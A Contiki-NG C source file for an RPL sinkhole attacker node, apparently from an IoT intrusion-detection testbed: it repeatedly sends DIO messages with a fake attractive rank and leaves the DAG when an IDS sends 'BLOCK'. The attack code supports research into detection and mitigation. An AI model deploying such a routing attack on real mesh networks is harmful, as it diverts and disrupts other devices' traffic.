#include "contiki.h"

#include "net/routing/routing.h"
#include "net/routing/rpl-lite/rpl.h"
#include "net/routing/rpl-lite/rpl-icmp6.h"
#include "net/ipv6/simple-udp.h"

#include "sys/log.h"

#include <string.h>

#define LOG_MODULE "Sinkhole"
#define LOG_LEVEL LOG_LEVEL_INFO

#define UDP_PORT 8765
#define UDP_SERVER_PORT 5678

#define SINKHOLE_START_DELAY (10 * CLOCK_SECOND)
#define SINKHOLE_DIO_INTERVAL (5 * CLOCK_SECOND)

static struct simple_udp_connection udp_conn;

static bool blocked = false;

PROCESS(sinkhole_process, "Sinkhole attacker");
AUTOSTART_PROCESSES(&sinkhole_process);

/*---------------------------------------------------------------------------*/

static void
udp_rx_callback(struct simple_udp_connection *c,
                const uip_ipaddr_t *sender_addr,
                uint16_t sender_port,
                const uip_ipaddr_t *receiver_addr,
                uint16_t receiver_port,
                const uint8_t *data,
                uint16_t datalen)
{
  if(datalen >= 5 && strncmp((const char *)data, "BLOCK", 5) == 0) {

    LOG_WARN("MITIGATION: BLOCK received from IDS\n");

    blocked = true;

    /*
     * Stop participating in the RPL DAG.
     * RPL-Lite will poison the route and leave after
     * advertising the poisoned state.
     */
    rpl_dag_poison_and_leave();

    LOG_WARN("MITIGATION: sinkhole poisoned and leaving DAG\n");
  }
}

/*---------------------------------------------------------------------------*/

PROCESS_THREAD(sinkhole_process, ev, data)
{
  static struct etimer dio_timer;

  PROCESS_BEGIN();

  simple_udp_register(&udp_conn,
                      UDP_PORT,
                      NULL,
                      UDP_SERVER_PORT,
                      udp_rx_callback);

  LOG_INFO("Sinkhole attacker starting\n");

  etimer_set(&dio_timer, SINKHOLE_START_DELAY);

  PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&dio_timer));

  LOG_WARN("SINKHOLE ATTACK ACTIVE\n");

  while(!blocked) {

    /*
     * rpl_icmp6_dio_output() normally calculates the real
     * rank first. The project-specific RPL patch then
     * replaces only the advertised DIO rank.
     */
    rpl_icmp6_dio_output(NULL);

    LOG_WARN("SINKHOLE DIO SENT with fake attractive rank\n");

    etimer_set(&dio_timer, SINKHOLE_DIO_INTERVAL);

    PROCESS_WAIT_EVENT_UNTIL(etimer_expired(&dio_timer));
  }

  LOG_WARN("SINKHOLE ATTACK STOPPED\n");

  PROCESS_END();
}

/*---------------------------------------------------------------------------*/
